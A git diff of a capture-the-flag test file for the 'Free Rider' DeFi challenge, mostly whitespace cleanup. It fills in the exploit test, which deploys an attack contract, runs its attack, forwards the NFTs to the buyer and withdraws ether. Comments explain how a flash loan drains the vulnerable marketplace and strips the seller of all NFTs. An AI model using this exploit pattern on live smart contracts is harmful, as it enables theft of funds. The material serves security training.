@@ -45,7 +45,7 @@ describe('[Challenge] Free Rider', function () {
             this.uniswapFactory.address,
             this.weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // Note that the function takes care of deploying the pair automatically
         await this.token.approve(
@@ -61,7 +61,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
         this.uniswapPair = await UniswapPairFactory.attach(
@@ -98,13 +98,45 @@ describe('[Challenge] Free Rider', function () {
         // Deploy buyer's contract, adding the attacker as the partner
         this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
             attacker.address, // partner
-            this.nft.address, 
+            this.nft.address,
             { value: BUYER_PAYOUT }
         );
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackBuyerContract = this.buyerContract.connect(attacker)
+        const attackNFT = this.nft.connect(attacker)
+        const attackMarketplace = this.marketplace.connect(attacker)
+        const attackWeth = this.weth.connect(attacker)
+        const attackToken = this.token.connect(attacker)
+        const attackFactory = this.uniswapFactory.connect(attacker);
+
+        // we deploy our attack contract
+        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
+        const attackContract = await AttackFactory.deploy(
+            attackBuyerContract.address,
+            attackNFT.address,
+            attackMarketplace.address,
+            attackWeth.address,
+            attackToken.address,
+            attackFactory.address,
+        );
+
+        //we attack the marketplace
+        await attackContract.attack();
+
+        //we send the nft and collect our payout
+        await attackContract.sendNFTToBuyer();
+        //we withdraw the ether on our contract sent by the marketplace
+        await attackContract.withdraw();
+
+        // We now have -15 + 90 + 45 = 120 ether for the cost of a few transaction and a 3% fee on uniswap for our 15 eth flash loan
+        // The buyer got 6 NFTs for 45 ether
+        // The marketplace lost 75 ether
+        // The seller lost all of their NFTs
+
     });
 
     after(async function () {
